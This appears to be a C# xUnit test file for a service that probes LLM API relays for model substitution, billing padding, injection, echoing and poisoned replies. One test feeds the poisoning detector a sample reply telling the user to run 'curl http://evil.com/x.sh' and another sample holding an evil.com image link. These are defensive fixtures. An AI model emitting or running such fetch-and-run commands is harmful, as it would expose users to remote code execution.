using Novara.Services;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using Xunit;

namespace Novara.Tests;


public class RelayProbeServiceTests
{


    [Fact]
    public void ScoreProbe_MapsVerdicts()
    {
        Assert.Equal(1.0, RelayProbeService.ScoreProbe(ProbeVerdict.Pass));
        Assert.Equal(0.5, RelayProbeService.ScoreProbe(ProbeVerdict.Warn));
        Assert.Equal(0.0, RelayProbeService.ScoreProbe(ProbeVerdict.Fail));
    }

    [Fact]
    public void ComputeScore_AllPass_Is100()
    {
        var results = All("identity", "benchmark", "tool", "billing", "injection", "poisoning", "format", "truncation")
            .Select(k => (k, ProbeVerdict.Pass)).ToList();
        Assert.Equal(100.0, RelayProbeService.ComputeScore(results));
    }

    [Fact]
    public void ComputeScore_AllFail_Is0()
    {
        var results = All("identity", "benchmark").Select(k => (k, ProbeVerdict.Fail)).ToList();
        Assert.Equal(0.0, RelayProbeService.ComputeScore(results));
    }

    [Fact]
    public void ComputeScore_AllSkip_IsNegative()
    {
        var results = All("identity", "benchmark").Select(k => (k, ProbeVerdict.Skip)).ToList();
        Assert.Equal(-1.0, RelayProbeService.ComputeScore(results));
    }

    [Fact]
    public void ComputeScore_SkipsAreRenormalized()
    {

        var results = new List<(string, ProbeVerdict)>
        {
            ("identity", ProbeVerdict.Fail),
            ("benchmark", ProbeVerdict.Pass),
        };
        Assert.Equal(50.0, RelayProbeService.ComputeScore(results));
    }

    [Theory]
    [InlineData(95, "trusted")]
    [InlineData(90, "trusted")]
    [InlineData(80, "mostly-trusted")]
    [InlineData(75, "mostly-trusted")]
    [InlineData(60, "suspicious")]
    [InlineData(50, "suspicious")]
    [InlineData(30, "high-risk")]
    [InlineData(-1, "unknown")]
    public void VerdictFromScore_Tiers(double score, string expected)
    {
        Assert.Equal(expected, RelayProbeService.VerdictFromScore(score));
    }



    [Theory]
    [InlineData("longcat-2.0", "LongCat-2.0", true)]
    [InlineData("deepseek-v4-pro", "deepseek-ai/DeepSeek-V4-Pro", true)]
    [InlineData("gpt-4o", "gpt-4o-2024-08-06", true)]
    [InlineData("gpt-4o", "gpt-4.1", false)]
    [InlineData("gpt-4o", "gpt-4o-mini", false)]
    [InlineData("my-model", "deepseek-ai/DeepSeek-V4-Flash", false)]
    [InlineData("deepseek/deepseek-chat", "deepseek/deepseek-chat", true)]
    [InlineData("deepseek-ai/DeepSeek-V4-Pro", "DeepSeek-V4-Pro", true)]
    public void ModelsMatch_NormalizedComparison(string claimed, string returned, bool expected)
    {
        Assert.Equal(expected, RelayProbeService.ModelsMatch(claimed, returned));
    }

    [Fact]
    public void AnalyzeIdentity_Match_Passes()
    {
        var (v, suspect, _) = RelayProbeService.AnalyzeIdentity("longcat-2.0", "LongCat-2.0");
        Assert.Equal(ProbeVerdict.Pass, v);
        Assert.Null(suspect);
    }

    [Fact]
    public void AnalyzeIdentity_Mismatch_Warns()
    {

        var (v, suspect, _) = RelayProbeService.AnalyzeIdentity("gpt-4o", "gpt-4.1");
        Assert.Equal(ProbeVerdict.Warn, v);
        Assert.Equal("gpt-4.1", suspect);
    }

    [Fact]
    public void AnalyzeIdentity_NoMetadata_Warns()
    {
        var (v, suspect, _) = RelayProbeService.AnalyzeIdentity("gpt-4o", null);
        Assert.Equal(ProbeVerdict.Warn, v);
        Assert.Null(suspect);
    }



    [Theory]
    [InlineData("3", "3", true)]
    [InlineData("9.9", "The larger is 9.9", true)]
    [InlineData("173", "173", true)]
    [InlineData("3", "4", false)]
    public void CheckBenchmarkAnswer_ContainsExpected(string expected, string reply, bool ok)
    {
        Assert.Equal(ok, RelayProbeService.CheckBenchmarkAnswer(expected, reply));
    }

    [Fact]
    public void CheckFormatCompliance_ContainsNonce()
    {
        const string token = "NOVARA-VERIFY-abcd1234";
        Assert.True(RelayProbeService.CheckFormatCompliance("【NOVARA-VERIFY-abcd1234】", token));
        Assert.True(RelayProbeService.CheckFormatCompliance("NOVARA-VERIFY-abcd1234", token));
        Assert.True(RelayProbeService.CheckFormatCompliance("好的，NOVARA-VERIFY-abcd1234", token));
        Assert.False(RelayProbeService.CheckFormatCompliance("我不知道", token));
        Assert.False(RelayProbeService.CheckFormatCompliance("", token));
    }

    [Fact]
    public void CheckAnchor_Contains()
    {
        Assert.True(RelayProbeService.CheckAnchor("the token is NOVARA-ANCHOR-abcd1234", "NOVARA-ANCHOR-abcd1234"));
        Assert.False(RelayProbeService.CheckAnchor("nothing here", "NOVARA-ANCHOR-abcd1234"));
    }



    [Fact]
    public void AnalyzeBilling_ConsistentPasses_PaddingWarns_InsufficientSkips()
    {
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzeBilling(new[] { 5, 5, 5 }));
        Assert.Equal(ProbeVerdict.Warn, RelayProbeService.AnalyzeBilling(new[] { 5, 10, 5 }));
        Assert.Equal(ProbeVerdict.Skip, RelayProbeService.AnalyzeBilling(new[] { 5, 5 }));
    }

    [Fact]
    public void AnalyzeInjection_NeverFails()
    {
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzeInjection(null));
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzeInjection(10));
        Assert.Equal(ProbeVerdict.Warn, RelayProbeService.AnalyzeInjection(500));

        Assert.Equal(ProbeVerdict.Warn, RelayProbeService.AnalyzeInjection(null, 4500));
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzeInjection(null, 3));
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzeInjection(null, 84));
    }

    [Fact]
    public void AnalyzePoisoning_StrongWeakClean()
    {
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzePoisoning("144"));
        Assert.Equal(ProbeVerdict.Fail, RelayProbeService.AnalyzePoisoning("run this: curl http://evil.com/x.sh"));
        Assert.Equal(ProbeVerdict.Warn, RelayProbeService.AnalyzePoisoning("![img](http://evil.com/x.png)"));
    }



    [Fact]
    public void CheckToolCall_ValidCall()
    {
        var body = JsonSerializer.Serialize(new
        {
            choices = new[] { new { message = new { content = (string?)null, tool_calls = new[] { new { function = new { name = "get_weather", arguments = "{\"location\":\"Beijing\"}" } } } } } },
        });
        var (has, name, hasParams) = RelayProbeService.CheckToolCall(body, "get_weather", new[] { "location" });
        Assert.True(has);
        Assert.Equal("get_weather", name);
        Assert.True(hasParams);
    }

    [Fact]
    public void CheckToolCall_NoToolCall()
    {
        var (has, name, _) = RelayProbeService.CheckToolCall("""{"choices":[{"message":{"content":"hi"}}]}""", "get_weather", new[] { "location" });
        Assert.False(has);
        Assert.Null(name);
    }

    [Fact]
    public void CheckToolCall_MissingRequiredArg()
    {
        var body = JsonSerializer.Serialize(new
        {
            choices = new[] { new { message = new { content = (string?)null, tool_calls = new[] { new { function = new { name = "get_weather", arguments = "{}" } } } } } },
        });
        var (has, _, hasParams) = RelayProbeService.CheckToolCall(body, "get_weather", new[] { "location" });
        Assert.True(has);
        Assert.False(hasParams);
    }

    [Fact]
    public void BuildNonce_Is8Hex()
    {
        var n = RelayProbeService.BuildNonce();
        Assert.Equal(8, n.Length);
        Assert.Matches("^[0-9a-f]{8}$", n);
    }



    [Theory]
    [InlineData("qwen2.5-7b", true)]
    [InlineData("llama-3-8b", true)]
    [InlineData("glm-4-9b", true)]
    [InlineData("qwen2.5-1.5b", true)]
    [InlineData("deepseek-r1-1.5b", true)]
    [InlineData("llama-3-70b", false)]
    [InlineData("gpt-4o", false)]
    [InlineData("deepseek-v3", false)]
    [InlineData("claude-3-5-sonnet", false)]
    [InlineData("", false)]
    public void IsSmallModel_DetectsSmallParams(string model, bool expected)
    {
        Assert.Equal(expected, RelayProbeService.IsSmallModel(model));
    }



    private static string[] All(params string[] keys) => keys;

    private sealed class StubHandler : HttpMessageHandler
    {
        private readonly Func<HttpRequestMessage, HttpResponseMessage> _responder;
        public StubHandler(Func<HttpRequestMessage, HttpResponseMessage> responder) => _responder = responder;
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken ct)
            => Task.FromResult(_responder(request));
    }

    private static string ExtractPrompt(HttpRequestMessage req)
    {
        var body = req.Content!.ReadAsStringAsync().GetAwaiter().GetResult();
        using var doc = JsonDocument.Parse(body);
        var messages = doc.RootElement.GetProperty("messages");
        return messages[messages.GetArrayLength() - 1].GetProperty("content").GetString() ?? "";
    }

    private static string ChatJson(string content) => JsonSerializer.Serialize(new
    {
        model = "gpt-4o",
        choices = new[] { new { message = new { content } } },
        usage = new { prompt_tokens = 5, completion_tokens = 1, total_tokens = 6 },
    });

    private static readonly string ToolCallJson = JsonSerializer.Serialize(new
    {
        model = "gpt-4o",
        choices = new[] { new { message = new { content = (string?)null, tool_calls = new[] { new { function = new { name = "get_weather", arguments = "{\"location\":\"Beijing\"}" } } } } } },
        usage = new { prompt_tokens = 5, completion_tokens = 1, total_tokens = 6 },
    });

    [Fact]
    public async Task ProbeAsync_AllProbesPass_Trusted()
    {
        var handler = new StubHandler(req =>
        {
            if (req.Method != HttpMethod.Post) return new HttpResponseMessage(HttpStatusCode.NotFound) { Content = new StringContent("{}") };
            var prompt = ExtractPrompt(req);
            string content;



            if (prompt.Contains("strawberry")) content = "3";
            else if (prompt.Contains("9.11")) content = "9.9";
            else if (prompt.Contains("24 * 7")) content = "173";
            else if (prompt.StartsWith("只回复")) content = Regex.Match(prompt, "【NOVARA-VERIFY-[0-9a-f]{8}】").Value;
            else if (prompt.Contains("weather")) return new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(ToolCallJson, Encoding.UTF8, "application/json") };
            else if (prompt.Contains("Reply with exactly: OK")) content = "OK";
            else if (prompt == "Hi") content = "Hello!";
            else if (prompt.Contains("12×7")) content = "144";
            else if (prompt.Contains("复述")) content = "NOVARA-ANCHOR-" + Regex.Match(prompt, "NOVARA-ANCHOR-[0-9a-f]{8}").Value;
            else content = "hi";
            return new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(ChatJson(content), Encoding.UTF8, "application/json") };
        });

        var report = await RelayProbeService.ProbeAsync("https://api.test.com", "sk-test", "gpt-4o", handler: handler);

        Assert.True(report.Reachable);
        Assert.Equal(8, report.Probes.Count);
        Assert.All(report.Probes, p => Assert.Equal(ProbeVerdict.Pass, p.Verdict));
        Assert.Equal(100.0, report.Score);
        Assert.Equal("trusted", report.Verdict);
    }

    [Fact]
    public async Task ProbeAsync_GateFails_Offline()
    {
        var handler = new StubHandler(req =>
            new HttpResponseMessage(HttpStatusCode.Unauthorized)
            {
                Content = new StringContent("""{"error":{"code":"invalid_api_key","message":"bad key"}}""", Encoding.UTF8, "application/json"),
            });

        var report = await RelayProbeService.ProbeAsync("https://api.test.com", "sk-test", "gpt-4o", handler: handler);

        Assert.False(report.Reachable);
        Assert.Equal("offline", report.Verdict);
        Assert.Equal(8, report.Probes.Count);
        Assert.All(report.Probes, p => Assert.Equal(ProbeVerdict.Skip, p.Verdict));
    }



    private static int ExtractMaxTokens(HttpRequestMessage req)
    {
        var body = req.Content!.ReadAsStringAsync().GetAwaiter().GetResult();
        using var doc = JsonDocument.Parse(body);
        return doc.RootElement.TryGetProperty("max_tokens", out var v) && v.TryGetInt32(out var n) ? n : 0;
    }

    private static HttpResponseMessage ChatJsonReporting(string content, int completionTokens)
        => new(HttpStatusCode.OK)
        {
            Content = new StringContent(JsonSerializer.Serialize(new
            {
                model = "gpt-4o",
                choices = new[] { new { message = new { content } } },
                usage = new { prompt_tokens = 5, completion_tokens = completionTokens, total_tokens = 5 + completionTokens },
            }), Encoding.UTF8, "application/json"),
        };





    [Fact]
    public async Task ProbeAsync_MaximalButCompliantReplies_DoNotSkipAnyProbe()
    {
        var handler = new StubHandler(req =>
        {
            if (req.Method != HttpMethod.Post) return new HttpResponseMessage(HttpStatusCode.NotFound) { Content = new StringContent("{}") };
            var prompt = ExtractPrompt(req);
            var completion = ExtractMaxTokens(req);
            if (prompt.Contains("strawberry")) return ChatJsonReporting("3", completion);
            if (prompt.Contains("9.11")) return ChatJsonReporting("9.9", completion);
            if (prompt.Contains("24 * 7")) return ChatJsonReporting("173", completion);
            if (prompt.StartsWith("只回复")) return ChatJsonReporting(Regex.Match(prompt, "【NOVARA-VERIFY-[0-9a-f]{8}】").Value, completion);
            if (prompt.Contains("weather")) return ChatJsonReporting("", completion);
            if (prompt.Contains("Reply with exactly: OK")) return ChatJsonReporting("OK", completion);
            if (prompt == "Hi") return ChatJsonReporting("Hello!", completion);
            if (prompt.Contains("12×7")) return ChatJsonReporting("144", completion);
            if (prompt.Contains("复述")) return ChatJsonReporting("NOVARA-ANCHOR-" + Regex.Match(prompt, "NOVARA-ANCHOR-[0-9a-f]{8}").Value, completion);
            return ChatJsonReporting("hi", completion);
        });

        var report = await RelayProbeService.ProbeAsync("https://api.test.com", "sk-test", "gpt-4o", handler: handler);

        Assert.Equal(8, report.Probes.Count);
        Assert.DoesNotContain(report.Probes, p => p.Summary == "token-budget");
        Assert.All(report.Probes, p => Assert.NotEqual(ProbeVerdict.Skip, p.Verdict));
    }



    [Fact]
    public async Task ProbeAsync_InflatedUsageReport_StillTripsTheGuard()
    {
        var handler = new StubHandler(req =>
        {
            if (req.Method != HttpMethod.Post) return new HttpResponseMessage(HttpStatusCode.NotFound) { Content = new StringContent("{}") };
            return ChatJsonReporting("hi", 5000);
        });

        var report = await RelayProbeService.ProbeAsync("https://api.test.com", "sk-test", "gpt-4o", handler: handler);

        Assert.Equal(8, report.Probes.Count);
        Assert.Contains(report.Probes, p => p.Summary == "token-budget");
    }



    private const string FmtPrompt = "只回复【NOVARA-VERIFY-abcd1234】，不要输出任何其他文字。";
    private static readonly string[] FmtSignatures = { "只回复【", "不要输出任何其他文字" };
    private const string PoisPrompt = "12×7 等于几？只回答数字。";
    private static readonly string[] PoisSignatures = { "只回答数字" };
    private static readonly string[] TruncSignatures = { "请复述我最后给出的特殊标记" };

    [Fact]
    public void LooksLikeEcho_DetectsInstructionReplay()
    {

        Assert.True(RelayProbeService.LooksLikeEcho(FmtPrompt, FmtPrompt, FmtSignatures));
        Assert.True(RelayProbeService.LooksLikeEcho(PoisPrompt, PoisPrompt, PoisSignatures));

        Assert.False(RelayProbeService.LooksLikeEcho("【NOVARA-VERIFY-abcd1234】", FmtPrompt, FmtSignatures));
        Assert.False(RelayProbeService.LooksLikeEcho("", FmtPrompt, FmtSignatures));
        Assert.False(RelayProbeService.LooksLikeEcho(null, FmtPrompt, FmtSignatures));
    }






    [Fact]
    public void LooksLikeEcho_DoesNotFlagHonestAnswersThatReusePromptWording()
    {
        const string truncPrompt =
            "filler filler filler 请复述我最后给出的特殊标记：NOVARA-ANCHOR-abc123";
        Assert.False(RelayProbeService.LooksLikeEcho(
            "最后给出的特殊标记是 NOVARA-ANCHOR-abc123。", truncPrompt, TruncSignatures));
        Assert.False(RelayProbeService.LooksLikeEcho(
            "最后给出的特殊标记：NOVARA-ANCHOR-abc123", truncPrompt, TruncSignatures));

        Assert.False(RelayProbeService.LooksLikeEcho("12×7 等于几的答案是 84。", PoisPrompt, PoisSignatures));
        Assert.False(RelayProbeService.LooksLikeEcho("84", PoisPrompt, PoisSignatures));


        Assert.True(RelayProbeService.LooksLikeEcho(
            "请复述我最后给出的特殊标记：NOVARA-ANCHOR-abc123", truncPrompt, TruncSignatures));
        Assert.True(RelayProbeService.LooksLikeEcho(
            "只回答数字", PoisPrompt, PoisSignatures));
    }



    [Fact]
    public void LooksLikeEcho_LongRunIgnoresWhitespaceReflowButNeedsALongRun()
    {
        var prompt = "filler filler filler 请复述我最后给出的特殊标记：NOVARA-ANCHOR-abc123";

        Assert.True(RelayProbeService.LooksLikeEcho(
            "filler filler\nfiller   请复述我最后给出的特殊标记：NOVARA-ANCHOR-abc123", prompt,
            System.Array.Empty<string>()));

        Assert.False(RelayProbeService.LooksLikeEcho("NOVARA-ANCHOR-abc123", prompt, System.Array.Empty<string>()));
    }

    [Fact]
    public void CheckBenchmarkAnswer_IgnoresTheEchoedNonceMarker()
    {


        Assert.False(RelayProbeService.CheckBenchmarkAnswer("3", "REQ-3f1a2b3c"));
        Assert.True(RelayProbeService.CheckBenchmarkAnswer("3", "The answer is 3"));
        Assert.True(RelayProbeService.CheckBenchmarkAnswer("3", "REQ-9f1a2b4c but really 3"));
    }



    [Fact]
    public void ComputeCoverage_IsMeasuredAgainstTheWholeSuite()
    {
        var all = All("identity", "benchmark", "tool", "billing", "injection", "poisoning", "format", "truncation");
        Assert.Equal(1.0, RelayProbeService.ComputeCoverage(all.Select(k => (k, ProbeVerdict.Pass)).ToList()));
        Assert.Equal(0.20, RelayProbeService.ComputeCoverage(new List<(string, ProbeVerdict)> { ("identity", ProbeVerdict.Pass) }), 3);
    }

    [Fact]
    public void ApplyVerdictCaps_IdentityOnlyRun_CannotClaimTrusted()
    {


        var results = All("identity", "benchmark", "tool", "billing", "injection", "poisoning", "format", "truncation")
            .Select(k => (k, k == "identity" ? ProbeVerdict.Pass : ProbeVerdict.Skip)).ToList();
        Assert.Equal(100.0, RelayProbeService.ComputeScore(results));
        Assert.Equal(RelayProbeService.VerdictMostlyTrusted,
            RelayProbeService.ApplyVerdictCaps(RelayProbeService.VerdictFromScore(100.0), results));
    }

    [Fact]
    public void ApplyVerdictCaps_IdentityWarn_HoldsBelowTrusted()
    {


        var results = All("identity", "benchmark", "tool", "billing", "injection", "poisoning", "format", "truncation")
            .Select(k => (k, k == "identity" ? ProbeVerdict.Warn : ProbeVerdict.Pass)).ToList();
        Assert.Equal(90.0, RelayProbeService.ComputeScore(results), 6);
        Assert.Equal("trusted", RelayProbeService.VerdictFromScore(90.0));
        Assert.Equal(RelayProbeService.VerdictMostlyTrusted,
            RelayProbeService.ApplyVerdictCaps(RelayProbeService.VerdictFromScore(90.0), results));
    }






    [Fact]
    public void ApplyVerdictCaps_IdentitySkip_CannotClaimTrusted()
    {
        var results = All("identity", "benchmark", "tool", "billing", "injection", "poisoning", "format", "truncation")
            .Select(k => (k, k is "identity" or "tool" ? ProbeVerdict.Skip : ProbeVerdict.Pass)).ToList();
        Assert.Equal(0.65, RelayProbeService.ComputeCoverage(results), 3);
        Assert.Equal(100.0, RelayProbeService.ComputeScore(results), 6);
        Assert.Equal("trusted", RelayProbeService.VerdictFromScore(100.0));
        Assert.Equal(RelayProbeService.VerdictMostlyTrusted,
            RelayProbeService.ApplyVerdictCaps(RelayProbeService.VerdictFromScore(100.0), results));
    }



    [Fact]
    public void ApplyVerdictCaps_IdentityFail_HoldsBelowTrusted()
    {
        var results = All("identity", "benchmark", "tool", "billing", "injection", "poisoning", "format", "truncation")
            .Select(k => (k, k == "identity" ? ProbeVerdict.Fail : ProbeVerdict.Pass)).ToList();
        Assert.Equal(RelayProbeService.VerdictMostlyTrusted,
            RelayProbeService.ApplyVerdictCaps(RelayProbeService.VerdictTrusted, results));
    }

    [Fact]
    public void ApplyVerdictCaps_LegitimateSkips_StillAllowTrusted()    {


        var results = All("identity", "benchmark", "tool", "billing", "injection", "poisoning", "format", "truncation")
            .Select(k => (k, k is "tool" or "billing" ? ProbeVerdict.Skip : ProbeVerdict.Pass)).ToList();
        Assert.Equal(0.70, RelayProbeService.ComputeCoverage(results), 3);
        Assert.Equal(RelayProbeService.VerdictTrusted,
            RelayProbeService.ApplyVerdictCaps(RelayProbeService.VerdictFromScore(100.0), results));
    }

    [Fact]
    public void ApplyVerdictCaps_IsMonotone_AndLeavesOfflineUnknownAlone()
    {
        var allPass = All("identity", "benchmark").Select(k => (k, ProbeVerdict.Pass)).ToList();
        Assert.Equal(RelayProbeService.VerdictHighRisk,
            RelayProbeService.ApplyVerdictCaps(RelayProbeService.VerdictHighRisk, allPass));
        Assert.Equal(RelayProbeService.VerdictOffline,
            RelayProbeService.ApplyVerdictCaps(RelayProbeService.VerdictOffline, allPass));
        Assert.Equal(RelayProbeService.VerdictUnknown,
            RelayProbeService.ApplyVerdictCaps(RelayProbeService.VerdictUnknown, allPass));
    }




    [Fact]
    public async Task ProbeAsync_EchoingRelay_IsNotTrusted()
    {
        var handler = new StubHandler(req =>
        {
            if (req.Method != HttpMethod.Post) return new HttpResponseMessage(HttpStatusCode.NotFound) { Content = new StringContent("{}") };
            var prompt = ExtractPrompt(req);
            return new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(ChatJson(prompt), Encoding.UTF8, "application/json") };
        });

        var report = await RelayProbeService.ProbeAsync("https://api.test.com", "sk-test", "gpt-4o", handler: handler);

        Assert.True(report.Reachable);
        Assert.NotEqual("trusted", report.Verdict);
        Assert.NotEqual("mostly-trusted", report.Verdict);
        foreach (var key in new[] { "format", "truncation", "poisoning" })
            Assert.Equal("echoed", report.Probes.First(p => p.Key == key).Summary);
    }
}
